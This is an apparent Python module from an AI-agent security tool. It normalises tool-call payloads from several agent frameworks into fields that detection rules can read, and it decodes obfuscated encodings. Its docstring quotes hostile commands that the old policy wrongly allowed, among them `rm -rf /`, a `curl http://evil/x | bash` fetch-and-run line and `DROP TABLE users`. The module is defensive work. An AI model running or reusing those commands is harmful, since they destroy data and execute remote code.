"""Normalise a raw tool-call payload into the fields a detection rule can read.

WHY THIS EXISTS
---------------
The shipped policy read `action` and expected to find a shell command there.
No agent framework puts it there. OpenAI sends `{"name": "run", "arguments":
"{\\"command\\": ...}"}` with the arguments as a JSON STRING; MCP sends
`params.name` and `params.arguments`; LangChain sends `tool_input`; Sentinel's
own SDK sends `metadata.arguments`. Reproduced against the live server, every
one of `rm -rf /`, `curl http://evil/x | bash`, `DROP TABLE users` and an
outbound POST to an attacker host returned `allow`, because the text the rules
were written for was never in the field the rules were reading.

This module is the fix at the root: a pure function from ANY of those shapes to
one `NormalisedAction` whose fields a rule can name -- `normalised.command_text`,
`normalised.sql_text`, `normalised.urls`, `normalised.paths`,
`normalised.decoded_texts`, `normalised.raw_texts`, `normalised.injection_markers`.
The policy engine attaches the result to the payload before matching, and it
overwrites any caller-supplied `normalised` key, so these are fields only this
module can write.

WHAT IT DELIBERATELY IS NOT
---------------------------
Not a decision. It extracts and folds; `config/default_policy.json` decides.
Not a model. Every step is a regular expression or a table, deterministic and
inspectable, and `injection_markers` names WHICH structural feature was seen
(`override_instruction:zh`, `hidden_text:bidi_override`) so an analyst can check
the finding rather than trust it.

Never raises. A malformed payload normalises to an empty `NormalisedAction`;
detection running on attacker-shaped input must not be the thing that crashes.
Depth is capped at `MAX_DEPTH`, total text at `MAX_TOTAL_TEXT`.
"""

from __future__ import annotations

import base64
import binascii
import html
import json
import re
from dataclasses import dataclass, field
from types import MappingProxyType
from typing import Any, Iterator, Mapping, Sequence
from urllib.parse import unquote

from sentinel.domain.event_normaliser_markers import fold_text, injection_markers_for

__all__ = [
    "MAX_DEPTH",
    "MAX_TOTAL_TEXT",
    "DecodedText",
    "NormalisedAction",
    "fold_text",
    "injection_markers_for",
    "normalise_event",
]

#: Nesting depth beyond which a payload is not read. An attacker can nest
#: arbitrarily; a real tool call does not.
MAX_DEPTH = 6
#: Total characters of string leaves retained across the whole payload.
MAX_TOTAL_TEXT = 64 * 1024
#: Characters retained from any one string leaf.
MAX_LEAF_TEXT = 8 * 1024
#: String leaves read before the walk stops.
MAX_LEAVES = 512
#: Decoded payloads retained.
MAX_DECODED = 32

_ARGUMENT_KEYS = ("arguments", "tool_input", "input", "args", "params", "parameters")
_COMMAND_KEYS = (
    "command", "cmd", "script", "shell", "shell_command", "command_line",
    "commandline", "commands", "bash", "code",
)
_SQL_KEYS = ("sql", "query", "statement", "q", "sql_query", "statements")
_URL_KEYS = (
    "destination", "url", "uri", "endpoint", "host", "hostname", "target_url",
    "webhook", "webhook_url", "callback_url", "base_url", "remote",
)
_PATH_KEYS = (
    "resource", "path", "file", "filename", "filepath", "file_path", "target",
    "source", "src", "dest", "destination_path", "directory", "dir", "cwd",
    "paths", "files",
)
_TOOL_KEYS = ("tool", "tool_name", "toolName", "name")
_SHELL_TOOL_HINT = re.compile(
    r"shell|exec|bash|run|terminal|cmd|command|powershell|subprocess|\bsh\b|script",
    re.IGNORECASE,
)
_SHELL_EVENT_TYPES = frozenset({"subprocess_exec", "shell", "command", "command_exec", "exec"})
_SHELL_METACHARS = ("|", ";", "&&", "$(", "`", ">", "<")

_SQL_FIRST = re.compile(
    r"^\s*(?:select|with|insert|update|delete|drop|truncate|alter|create|grant|"
    r"revoke|copy|merge|exec|execute|call)\b",
    re.IGNORECASE,
)
_URL = re.compile(r"(?i)\b(?:https?|ftp|wss?|sftp|smb|ldap)://[^\s'\"<>()\[\]{}|`\\]+")
_BARE_HOST = re.compile(r"^[a-z0-9](?:[a-z0-9.-]*[a-z0-9])?(?::\d{1,5})?(?:/\S*)?$", re.IGNORECASE)
_PATH_LIKE = re.compile(
    r"^(?:~|\$HOME|\.{1,2})?/[^\s]*$|^[A-Za-z]:\\|^\\\\|^[\w.@+-]+(?:/[\w.@+~-]*)+$"
)
_COMMAND_PATH_TOKEN = re.compile(r"(?<![\w:/])(?:~|\$HOME|\.{1,2})?/[\w.@+~/-]+")

# ── Encodings ────────────────────────────────────────────────────────────────

_B64_TOKEN = re.compile(r"(?<![A-Za-z0-9+/=])[A-Za-z0-9+/]{12,}={0,2}(?![A-Za-z0-9+/=])")
_B64URL_TOKEN = re.compile(r"(?<![A-Za-z0-9_-])[A-Za-z0-9_-]{16,}(?![A-Za-z0-9_-])")
_HEX_TOKEN = re.compile(r"(?<![0-9A-Za-z])(?:[0-9A-Fa-f]{2}){8,}(?![0-9A-Za-z])")
_HEX_ESCAPE = re.compile(r"(?:\\x[0-9A-Fa-f]{2}){4,}")
_HEX_ESCAPE_ONE = re.compile(r"\\x([0-9A-Fa-f]{2})")
_URL_ESCAPE = re.compile(r"%[0-9A-Fa-f]{2}")
_UNICODE_ESCAPE = re.compile(r"\\u([0-9A-Fa-f]{4})")
_HTML_ENTITY = re.compile(r"&#x?[0-9A-Fa-f]+;|&[a-z]+;")
_POWERSHELL_ENC = re.compile(
    r"(?i)(?:^|\s)-(?:e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedcommand)\s+"
    r"([A-Za-z0-9+/]{8,}={0,2})"
)

@dataclass(frozen=True, slots=True)
class DecodedText:
    """One encoded payload, decoded one level, with the encoding named."""

    encoding: str
    text: str
    source: str = ""

    def as_field(self) -> str:
        return f"{self.encoding}:{self.text}"


@dataclass(frozen=True, slots=True)
class NormalisedAction:
    """Everything a rule may want to read, extracted from whatever shape arrived."""

    action: str = ""
    tool: str = ""
    command_text: str = ""
    sql_text: str = ""
    urls: tuple[str, ...] = ()
    paths: tuple[str, ...] = ()
    decoded_texts: tuple[DecodedText, ...] = ()
    raw_texts: tuple[str, ...] = ()
    injection_markers: tuple[str, ...] = ()
    #: Argument containers merged, first key wins. For classifiers that need
    #: structure (`arguments.kind`) rather than text.
    arguments: Mapping[str, Any] = field(default_factory=lambda: MappingProxyType({}))
    truncated: bool = False

    def as_fields(self) -> dict[str, Any]:
        """The shape the policy engine attaches under `payload["normalised"]`."""
        return {
            "action": self.action,
            "tool": self.tool,
            "command_text": self.command_text,
            "sql_text": self.sql_text,
            "urls": list(self.urls),
            "paths": list(self.paths),
            "decoded_texts": [d.as_field() for d in self.decoded_texts],
            "raw_texts": list(self.raw_texts),
            "injection_markers": list(self.injection_markers),
            "truncated": self.truncated,
        }


# ── Walking ──────────────────────────────────────────────────────────────────


def _as_mapping(value: Any) -> Mapping[str, Any]:
    return value if isinstance(value, Mapping) else {}


def _parse_json_string(value: Any) -> Any:
    """OpenAI ships `arguments` as a JSON string. Parse it, or keep the string."""
    if isinstance(value, str) and len(value) <= MAX_TOTAL_TEXT:
        candidate = value.strip()
        if candidate[:1] in "{[":
            try:
                return json.loads(candidate)
            except (ValueError, TypeError, RecursionError):
                return value
    return value


class _Budget:
    """Mutable walk state, local to one normalisation call."""

    __slots__ = ("chars", "leaves", "truncated")

    def __init__(self) -> None:
        self.chars = 0
        self.leaves = 0
        self.truncated = False

    def take(self, text: str) -> str | None:
        if self.leaves >= MAX_LEAVES or self.chars >= MAX_TOTAL_TEXT:
            self.truncated = True
            return None
        if len(text) > MAX_LEAF_TEXT:
            text = text[:MAX_LEAF_TEXT]
            self.truncated = True
        remaining = MAX_TOTAL_TEXT - self.chars
        if len(text) > remaining:
            text = text[:remaining]
            self.truncated = True
        self.leaves += 1
        self.chars += len(text)
        return text


def _leaves(
    value: Any, path: str, depth: int, budget: _Budget
) -> Iterator[tuple[str, str]]:
    """Yield (dotted path, string) for every string leaf, depth- and size-capped."""
    if depth > MAX_DEPTH:
        budget.truncated = True
        return
    if isinstance(value, str):
        taken = budget.take(value)
        if taken is not None:
            yield path, taken
        return
    if isinstance(value, Mapping):
        for key, item in value.items():
            key_text = str(key)
            if key_text in _ARGUMENT_KEYS:
                item = _parse_json_string(item)
            yield from _leaves(item, f"{path}.{key_text}" if path else key_text, depth + 1, budget)
        return
    if isinstance(value, (list, tuple)):
        for index, item in enumerate(value[:MAX_LEAVES]):
            yield from _leaves(item, f"{path}[{index}]", depth + 1, budget)
        return
    if isinstance(value, (int, float, bool)) or value is None:
        return
    # Anything else (bytes, objects): its repr is not evidence.
    return


def _argument_containers(payload: Mapping[str, Any]) -> tuple[tuple[str, Any], ...]:
    """Every place a framework puts a tool's arguments, in priority order."""
    metadata = _as_mapping(payload.get("metadata"))
    params = _as_mapping(payload.get("params"))
    function = _as_mapping(payload.get("function"))
    found: list[tuple[str, Any]] = []
    for label, container in (("", payload), ("params", params), ("function", function), ("metadata", metadata)):
        for key in _ARGUMENT_KEYS:
            if key in container:
                item = _parse_json_string(container.get(key))
                if item is not None:
                    found.append((f"{label}.{key}" if label else key, item))
    return tuple(found)


def _merge_arguments(containers: Sequence[tuple[str, Any]]) -> Mapping[str, Any]:
    merged: dict[str, Any] = {}
    for _label, item in containers:
        if isinstance(item, Mapping):
            for key, value in item.items():
                merged.setdefault(str(key), value)
    return MappingProxyType(merged)


def _first_text(*candidates: Any) -> str:
    for candidate in candidates:
        if isinstance(candidate, str) and candidate.strip():
            return candidate.strip()
    return ""


def _strings_under(value: Any, keys: Sequence[str], depth: int = 0) -> Iterator[str]:
    """Strings found under any of `keys` inside `value`, recursively."""
    if depth > MAX_DEPTH:
        return
    if isinstance(value, Mapping):
        for key, item in value.items():
            if str(key) in keys:
                if isinstance(item, str):
                    yield item
                elif isinstance(item, (list, tuple)):
                    yield from (str(x) for x in item[:64] if isinstance(x, (str, int, float)))
                elif isinstance(item, Mapping):
                    yield from _strings_under(item, keys, depth + 1)
            elif isinstance(item, (Mapping, list, tuple)):
                yield from _strings_under(item, keys, depth + 1)
    elif isinstance(value, (list, tuple)):
        for item in value[:64]:
            yield from _strings_under(item, keys, depth + 1)


def _unique(items: Iterator[str] | Sequence[str], *, cap: int = 64) -> tuple[str, ...]:
    seen: list[str] = []
    for item in items:
        if item and item not in seen:
            seen.append(item)
            if len(seen) >= cap:
                break
    return tuple(seen)


# ── Field extraction ─────────────────────────────────────────────────────────


def _extract_command(
    payload: Mapping[str, Any],
    metadata: Mapping[str, Any],
    containers: Sequence[tuple[str, Any]],
    action: str,
    tool: str,
) -> str:
    pieces: list[str] = []
    for scope in (payload, metadata):
        pieces.extend(_strings_under(scope, _COMMAND_KEYS, depth=MAX_DEPTH - 1))
        args = scope.get("args")
        if isinstance(args, (list, tuple)):
            pieces.append(" ".join(str(a) for a in args[:128]))
    shell_tool = bool(_SHELL_TOOL_HINT.search(f"{tool} {action}"))
    for _label, item in containers:
        if isinstance(item, str):
            if shell_tool or any(m in item for m in _SHELL_METACHARS):
                pieces.append(item)
            continue
        if isinstance(item, (list, tuple)):
            pieces.append(" ".join(str(a) for a in item[:128] if isinstance(a, (str, int, float))))
            continue
        if isinstance(item, Mapping):
            pieces.extend(_strings_under(item, _COMMAND_KEYS))
            if shell_tool:
                pieces.extend(
                    text for _path, text in _leaves(item, "", 0, _Budget())
                )
    event_type = str(payload.get("eventType") or payload.get("event_type") or "").lower()
    if action and (
        event_type in _SHELL_EVENT_TYPES
        or any(ch.isspace() for ch in action.strip())
        or any(m in action for m in _SHELL_METACHARS)
    ):
        pieces.append(action)
    return "\n".join(_unique((fold_text(p) for p in pieces), cap=64))


def _extract_sql(
    payload: Mapping[str, Any],
    metadata: Mapping[str, Any],
    containers: Sequence[tuple[str, Any]],
    action: str,
) -> str:
    pieces: list[str] = []
    for scope in (payload, metadata):
        pieces.extend(_strings_under(scope, _SQL_KEYS, depth=MAX_DEPTH - 1))
    for _label, item in containers:
        if isinstance(item, Mapping):
            pieces.extend(_strings_under(item, _SQL_KEYS))
            for _path, text in _leaves(item, "", 0, _Budget()):
                if _SQL_FIRST.match(text) and len(text.split()) >= 2:
                    pieces.append(text)
        elif isinstance(item, str) and _SQL_FIRST.match(item) and len(item.split()) >= 2:
            pieces.append(item)
    if _SQL_FIRST.match(action) and len(action.split()) >= 2:
        pieces.append(action)
    return "\n".join(_unique((fold_text(p) for p in pieces), cap=32))


def _extract_urls(
    payload: Mapping[str, Any],
    metadata: Mapping[str, Any],
    containers: Sequence[tuple[str, Any]],
    raw_texts: Sequence[str],
    command_text: str,
) -> tuple[str, ...]:
    found: list[str] = []
    for scope in (payload, metadata):
        for value in _strings_under(scope, _URL_KEYS, depth=MAX_DEPTH - 1):
            found.append(fold_text(value))
    for _label, item in containers:
        if isinstance(item, Mapping):
            found.extend(fold_text(v) for v in _strings_under(item, _URL_KEYS))
    designated = [u for u in found if _URL.search(u) or _BARE_HOST.match(u)]
    for text in (*raw_texts, command_text):
        designated.extend(m.group(0).rstrip(".,;:'\"") for m in _URL.finditer(text))
    return _unique(designated)


def _extract_paths(
    payload: Mapping[str, Any],
    metadata: Mapping[str, Any],
    containers: Sequence[tuple[str, Any]],
    command_text: str,
) -> tuple[str, ...]:
    found: list[str] = []
    resource = payload.get("resource")
    if isinstance(resource, str) and resource.strip():
        found.append(fold_text(resource))
    for scope in (payload, metadata):
        found.extend(fold_text(v) for v in _strings_under(scope, _PATH_KEYS, depth=MAX_DEPTH - 1))
    for _label, item in containers:
        if isinstance(item, Mapping):
            found.extend(fold_text(v) for v in _strings_under(item, _PATH_KEYS))
            for _path, text in _leaves(item, "", 0, _Budget()):
                folded = fold_text(text)
                if _PATH_LIKE.match(folded) and not _URL.match(folded):
                    found.append(folded)
        elif isinstance(item, str):
            folded = fold_text(item)
            if _PATH_LIKE.match(folded) and not _URL.match(folded):
                found.append(folded)
    for token in _COMMAND_PATH_TOKEN.findall(command_text):
        found.append(token)
    return _unique(found)


# ── Decoding ─────────────────────────────────────────────────────────────────


def _printable(text: str) -> bool:
    if len(text) < 3:
        return False
    good = sum(1 for c in text if c.isprintable() or c in "\n\r\t")
    return good / len(text) >= 0.9


def _b64_bytes(token: str, *, urlsafe: bool = False) -> bytes | None:
    padded = token + "=" * (-len(token) % 4)
    try:
        decoder = base64.urlsafe_b64decode if urlsafe else base64.b64decode
        return decoder(padded)
    except (binascii.Error, ValueError):
        return None


def _decode_bytes(raw: bytes) -> str | None:
    for encoding in ("utf-8", "utf-16-le"):
        try:
            text = raw.decode(encoding)
        except UnicodeDecodeError:
            continue
        if _printable(text):
            return text
    return None


def _looks_like_a_word(token: str) -> bool:
    """A run of letters in one case is prose, not base64."""
    return token.isalpha() and (token.islower() or token.isupper() or token.istitle())


def _decoded_candidates(text: str, source: str) -> Iterator[DecodedText]:
    decoded: str | None
    for match in _POWERSHELL_ENC.finditer(text):
        raw = _b64_bytes(match.group(1))
        if raw:
            try:
                decoded = raw.decode("utf-16-le")
            except UnicodeDecodeError:
                decoded = ""
            if decoded and _printable(decoded):
                yield DecodedText("powershell-base64", fold_text(decoded), source)
    for match in _B64_TOKEN.finditer(text):
        token = match.group(0)
        if _looks_like_a_word(token.rstrip("=")):
            continue
        raw = _b64_bytes(token)
        decoded = _decode_bytes(raw) if raw else None
        if decoded:
            yield DecodedText("base64", fold_text(decoded), source)
    for match in _B64URL_TOKEN.finditer(text):
        token = match.group(0)
        if ("-" not in token and "_" not in token) or _looks_like_a_word(token):
            continue
        raw = _b64_bytes(token, urlsafe=True)
        decoded = _decode_bytes(raw) if raw else None
        if decoded:
            yield DecodedText("base64url", fold_text(decoded), source)
    for match in _HEX_TOKEN.finditer(text):
        try:
            decoded = _decode_bytes(bytes.fromhex(match.group(0)))
        except ValueError:
            decoded = None
        if decoded:
            yield DecodedText("hex", fold_text(decoded), source)
    if _HEX_ESCAPE.search(text):
        decoded = _HEX_ESCAPE_ONE.sub(lambda m: chr(int(m.group(1), 16)), text)
        if decoded != text:
            yield DecodedText("hex-escape", fold_text(decoded), source)
    if len(_URL_ESCAPE.findall(text)) >= 2:
        decoded = unquote(text)
        if decoded != text:
            yield DecodedText("url-encoded", fold_text(decoded), source)
    if len(_UNICODE_ESCAPE.findall(text)) >= 2:
        decoded = _UNICODE_ESCAPE.sub(lambda m: chr(int(m.group(1), 16)), text)
        if decoded != text:
            yield DecodedText("unicode-escape", fold_text(decoded), source)
    if len(_HTML_ENTITY.findall(text)) >= 2:
        decoded = html.unescape(text)
        if decoded != text:
            yield DecodedText("html-entity", fold_text(decoded), source)


def _decode_all(leaves: Sequence[tuple[str, str]]) -> tuple[DecodedText, ...]:
    out: list[DecodedText] = []
    seen: set[tuple[str, str]] = set()
    for path, text in leaves:
        for decoded in _decoded_candidates(text, path):
            key = (decoded.encoding, decoded.text[:256])
            if key in seen:
                continue
            seen.add(key)
            out.append(DecodedText(decoded.encoding, decoded.text[:4096], decoded.source))
            if len(out) >= MAX_DECODED:
                return tuple(out)
    return tuple(out)


# ── Entry point ──────────────────────────────────────────────────────────────


def _normalise(payload: Mapping[str, Any]) -> NormalisedAction:
    metadata = _as_mapping(payload.get("metadata"))
    params = _as_mapping(payload.get("params"))
    function = _as_mapping(payload.get("function"))
    containers = _argument_containers(payload)
    arguments = _merge_arguments(containers)

    action = _first_text(
        payload.get("action"), function.get("name"), params.get("name"), payload.get("name"),
        metadata.get("action"),
    )
    tool = _first_text(
        *(payload.get(k) for k in _TOOL_KEYS),
        params.get("name"),
        function.get("name"),
        *(metadata.get(k) for k in _TOOL_KEYS),
    )

    budget = _Budget()
    scan: dict[str, Any] = {
        k: v for k, v in payload.items() if str(k) not in {"normalised", "signature"}
    }
    leaves = tuple(_leaves(scan, "", 0, budget))
    raw_originals = tuple(text for _path, text in leaves)
    raw_texts = _unique((fold_text(text) for text in raw_originals), cap=MAX_LEAVES)

    command_text = _extract_command(payload, metadata, containers, action, tool)
    sql_text = _extract_sql(payload, metadata, containers, action)
    urls = _extract_urls(payload, metadata, containers, raw_texts, command_text)
    paths = _extract_paths(payload, metadata, containers, command_text)
    decoded = _decode_all(leaves)
    markers = injection_markers_for(raw_originals, raw_texts)

    return NormalisedAction(
        action=fold_text(action)[:MAX_LEAF_TEXT],
        tool=fold_text(tool)[:512],
        command_text=command_text,
        sql_text=sql_text,
        urls=urls,
        paths=paths,
        decoded_texts=decoded,
        raw_texts=raw_texts,
        injection_markers=markers,
        arguments=arguments,
        truncated=budget.truncated,
    )


def normalise_event(payload: Any) -> NormalisedAction:
    """Normalise any tool-call shape. Never raises; malformed input yields empty."""
    if not isinstance(payload, Mapping):
        return NormalisedAction()
    try:
        return _normalise(payload)
    except Exception:  # noqa: BLE001 - detection on attacker input must not crash
        return NormalisedAction(truncated=True)
